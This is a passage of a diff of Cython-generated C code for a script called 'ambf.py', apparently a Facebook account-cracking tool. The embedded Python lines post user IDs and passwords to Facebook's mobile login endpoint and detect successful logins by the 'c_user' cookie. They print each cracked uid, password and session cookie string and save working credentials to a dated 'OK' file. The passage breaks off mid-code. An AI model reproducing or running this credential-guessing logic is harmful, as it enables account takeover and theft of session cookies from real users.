- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- */
-        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_t_11 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
-          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
-          if (likely(__pyx_t_11)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
-            __Pyx_INCREF(__pyx_t_11);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_12, function);
-          }
-        }
-        __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
-        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_keys); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        __pyx_t_6 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
-          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_12);
-          if (likely(__pyx_t_6)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
-            __Pyx_INCREF(__pyx_t_6);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_12, function);
-          }
-        }
-        __pyx_t_8 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
-        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __pyx_t_21 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_8, Py_EQ)); if (unlikely(__pyx_t_21 < 0)) __PYX_ERR(0, 497, __pyx_L11_error)
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_20 = (__pyx_t_21 != 0);
-        if (__pyx_t_20) {
-
-          /* "ambf.py":498
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- * 			if "c_user" in ses.cookies.get_dict().keys():
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- * 				ok.append("%s|%s"%(uid, pw))
- */
-          __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __pyx_t_11 = NULL;
-          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
-            if (likely(__pyx_t_11)) {
-              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-              __Pyx_INCREF(__pyx_t_11);
-              __Pyx_INCREF(function);
-              __Pyx_DECREF_SET(__pyx_t_10, function);
-            }
-          }
-          __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_6);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_items); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-          __pyx_t_6 = NULL;
-          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_10);
-            if (likely(__pyx_t_6)) {
-              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-              __Pyx_INCREF(__pyx_t_6);
-              __Pyx_INCREF(function);
-              __Pyx_DECREF_SET(__pyx_t_10, function);
-            }
-          }
-          __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L11_error)
           __Pyx_GOTREF(__pyx_t_12);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          if (likely(PyList_CheckExact(__pyx_t_12)) || PyTuple_CheckExact(__pyx_t_12)) {
-            __pyx_t_10 = __pyx_t_12; __Pyx_INCREF(__pyx_t_10); __pyx_t_15 = 0;
-            __pyx_t_16 = NULL;
-          } else {
-            __pyx_t_15 = -1; __pyx_t_10 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L11_error)
-            __Pyx_GOTREF(__pyx_t_10);
-            __pyx_t_16 = Py_TYPE(__pyx_t_10)->tp_iternext; if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 498, __pyx_L11_error)
+        }
+        if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
+          PyObject* sequence = __pyx_t_12;
+          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
+          if (unlikely(size != 2)) {
+            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
+            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
+            __PYX_ERR(0, 497, __pyx_L1_error)
           }
+          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+          if (likely(PyTuple_CheckExact(sequence))) {
+            __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
+            __pyx_t_11 = PyTuple_GET_ITEM(sequence, 1); 
+          } else {
+            __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
+            __pyx_t_11 = PyList_GET_ITEM(sequence, 1); 
+          }
+          __Pyx_INCREF(__pyx_t_6);
+          __Pyx_INCREF(__pyx_t_11);
+          #else
+          __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 497, __pyx_L1_error)
+          __Pyx_GOTREF(__pyx_t_6);
+          __pyx_t_11 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 497, __pyx_L1_error)
+          __Pyx_GOTREF(__pyx_t_11);
+          #endif
           __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-          for (;;) {
-            if (likely(!__pyx_t_16)) {
-              if (likely(PyList_CheckExact(__pyx_t_10))) {
-                if (__pyx_t_15 >= PyList_GET_SIZE(__pyx_t_10)) break;
-                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-                __pyx_t_12 = PyList_GET_ITEM(__pyx_t_10, __pyx_t_15); __Pyx_INCREF(__pyx_t_12); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 498, __pyx_L11_error)
-                #else
-                __pyx_t_12 = PySequence_ITEM(__pyx_t_10, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L11_error)
-                __Pyx_GOTREF(__pyx_t_12);
-                #endif
-              } else {
-                if (__pyx_t_15 >= PyTuple_GET_SIZE(__pyx_t_10)) break;
-                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-                __pyx_t_12 = PyTuple_GET_ITEM(__pyx_t_10, __pyx_t_15); __Pyx_INCREF(__pyx_t_12); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 498, __pyx_L11_error)
-                #else
-                __pyx_t_12 = PySequence_ITEM(__pyx_t_10, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L11_error)
-                __Pyx_GOTREF(__pyx_t_12);
-                #endif
-              }
-            } else {
-              __pyx_t_12 = __pyx_t_16(__pyx_t_10);
-              if (unlikely(!__pyx_t_12)) {
-                PyObject* exc_type = PyErr_Occurred();
-                if (exc_type) {
-                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-                  else __PYX_ERR(0, 498, __pyx_L11_error)
-                }
-                break;
-              }
-              __Pyx_GOTREF(__pyx_t_12);
-            }
-            if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
-              PyObject* sequence = __pyx_t_12;
-              Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
-              if (unlikely(size != 2)) {
-                if (size > 2) __Pyx_RaiseTooManyValuesError(2);
-                else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
-                __PYX_ERR(0, 498, __pyx_L11_error)
-              }
-              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-              if (likely(PyTuple_CheckExact(sequence))) {
-                __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
-                __pyx_t_11 = PyTuple_GET_ITEM(sequence, 1); 
-              } else {
-                __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
-                __pyx_t_11 = PyList_GET_ITEM(sequence, 1); 
-              }
-              __Pyx_INCREF(__pyx_t_6);
-              __Pyx_INCREF(__pyx_t_11);
-              #else
-              __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 498, __pyx_L11_error)
-              __Pyx_GOTREF(__pyx_t_6);
-              __pyx_t_11 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 498, __pyx_L11_error)
-              __Pyx_GOTREF(__pyx_t_11);
-              #endif
-              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-            } else {
-              Py_ssize_t index = -1;
-              __pyx_t_14 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 498, __pyx_L11_error)
-              __Pyx_GOTREF(__pyx_t_14);
-              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-              __pyx_t_22 = Py_TYPE(__pyx_t_14)->tp_iternext;
-              index = 0; __pyx_t_6 = __pyx_t_22(__pyx_t_14); if (unlikely(!__pyx_t_6)) goto __pyx_L33_unpacking_failed;
-              __Pyx_GOTREF(__pyx_t_6);
-              index = 1; __pyx_t_11 = __pyx_t_22(__pyx_t_14); if (unlikely(!__pyx_t_11)) goto __pyx_L33_unpacking_failed;
-              __Pyx_GOTREF(__pyx_t_11);
-              if (__Pyx_IternextUnpackEndCheck(__pyx_t_22(__pyx_t_14), 2) < 0) __PYX_ERR(0, 498, __pyx_L11_error)
-              __pyx_t_22 = NULL;
-              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
-              goto __pyx_L34_unpacking_done;
-              __pyx_L33_unpacking_failed:;
-              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
-              __pyx_t_22 = NULL;
-              if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
-              __PYX_ERR(0, 498, __pyx_L11_error)
-              __pyx_L34_unpacking_done:;
-            }
-            __Pyx_XDECREF_SET(__pyx_v_key, __pyx_t_6);
-            __pyx_t_6 = 0;
-            __Pyx_XDECREF_SET(__pyx_v_value, __pyx_t_11);
-            __pyx_t_11 = 0;
-            __pyx_t_12 = PyTuple_New(2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L11_error)
-            __Pyx_GOTREF(__pyx_t_12);
-            __Pyx_INCREF(__pyx_v_key);
-            __Pyx_GIVEREF(__pyx_v_key);
-            PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_key);
-            __Pyx_INCREF(__pyx_v_value);
-            __Pyx_GIVEREF(__pyx_v_value);
-            PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_value);
-            __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s_3, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 498, __pyx_L11_error)
-            __Pyx_GOTREF(__pyx_t_11);
-            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-            if (unlikely(__Pyx_ListComp_Append(__pyx_t_8, (PyObject*)__pyx_t_11))) __PYX_ERR(0, 498, __pyx_L11_error)
-            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          }
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = __Pyx_PyString_Join(__pyx_kp_s__47, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-          __pyx_v_kuki = __pyx_t_10;
-          __pyx_t_10 = 0;
-
-          /* "ambf.py":499
- * 			if "c_user" in ses.cookies.get_dict().keys():
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))             # <<<<<<<<<<<<<<
- * 				ok.append("%s|%s"%(uid, pw))
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- */
-          __pyx_t_10 = PyTuple_New(3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 499, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
-          __Pyx_INCREF(__pyx_v_kuki);
-          __Pyx_GIVEREF(__pyx_v_kuki);
-          PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_v_kuki);
-          __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_0_92m_s_s_s_0_97m, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 499, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 499, __pyx_L11_error)
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-          /* "ambf.py":500
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- * 				ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break
- */
-          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ok); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 500, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 500, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
-          __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 500, __pyx_L11_error)
+        } else {
+          Py_ssize_t index = -1;
+          __pyx_t_14 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 497, __pyx_L1_error)
+          __Pyx_GOTREF(__pyx_t_14);
+          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+          __pyx_t_19 = Py_TYPE(__pyx_t_14)->tp_iternext;
+          index = 0; __pyx_t_6 = __pyx_t_19(__pyx_t_14); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
+          __Pyx_GOTREF(__pyx_t_6);
+          index = 1; __pyx_t_11 = __pyx_t_19(__pyx_t_14); if (unlikely(!__pyx_t_11)) goto __pyx_L27_unpacking_failed;
           __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_23 = __Pyx_PyObject_Append(__pyx_t_8, __pyx_t_11); if (unlikely(__pyx_t_23 == ((int)-1))) __PYX_ERR(0, 500, __pyx_L11_error)
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+          if (__Pyx_IternextUnpackEndCheck(__pyx_t_19(__pyx_t_14), 2) < 0) __PYX_ERR(0, 497, __pyx_L1_error)
+          __pyx_t_19 = NULL;
+          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
+          goto __pyx_L28_unpacking_done;
+          __pyx_L27_unpacking_failed:;
+          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
+          __pyx_t_19 = NULL;
+          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
+          __PYX_ERR(0, 497, __pyx_L1_error)
+          __pyx_L28_unpacking_done:;
+        }
+        __Pyx_XDECREF_SET(__pyx_v_key, __pyx_t_6);
+        __pyx_t_6 = 0;
+        __Pyx_XDECREF_SET(__pyx_v_value, __pyx_t_11);
+        __pyx_t_11 = 0;
+        __pyx_t_12 = PyTuple_New(2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L1_error)
+        __Pyx_GOTREF(__pyx_t_12);
+        __Pyx_INCREF(__pyx_v_key);
+        __Pyx_GIVEREF(__pyx_v_key);
+        PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_key);
+        __Pyx_INCREF(__pyx_v_value);
+        __Pyx_GIVEREF(__pyx_v_value);
+        PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_value);
+        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s_3, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 497, __pyx_L1_error)
+        __Pyx_GOTREF(__pyx_t_11);
+        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+        if (unlikely(__Pyx_ListComp_Append(__pyx_t_8, (PyObject*)__pyx_t_11))) __PYX_ERR(0, 497, __pyx_L1_error)
+        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      }
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = __Pyx_PyString_Join(__pyx_kp_s__47, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __pyx_v_kuki = __pyx_t_10;
+      __pyx_t_10 = 0;
 
-          /* "ambf.py":501
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- * 				ok.append("%s|%s"%(uid, pw))
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
+      /* "ambf.py":498
+ * 		if "c_user" in ses.cookies.get_dict().keys():
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))             # <<<<<<<<<<<<<<
+ * 			ok.append("%s|%s"%(uid, pw))
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  */
-          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 501, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __pyx_t_10 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 501, __pyx_L11_error)
+      __pyx_t_10 = PyTuple_New(3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 498, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
+      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
+      __Pyx_INCREF(__pyx_v_kuki);
+      __Pyx_GIVEREF(__pyx_v_kuki);
+      PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_v_kuki);
+      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_0_92m_s_s_s_0_97m, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 498, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 498, __pyx_L1_error)
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+
+      /* "ambf.py":499
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ * 			ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break
+ */
+      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ok); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 499, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 499, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
+      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
+      __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 499, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_8, __pyx_t_11); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 499, __pyx_L1_error)
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+
+      /* "ambf.py":500
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ * 			ok.append("%s|%s"%(uid, pw))
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ */
+      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __pyx_t_10 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __Pyx_GIVEREF(__pyx_t_10);
+      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_10);
+      __Pyx_INCREF(__pyx_n_s_a);
+      __Pyx_GIVEREF(__pyx_n_s_a);
+      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_a);
+      __pyx_t_10 = 0;
+      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
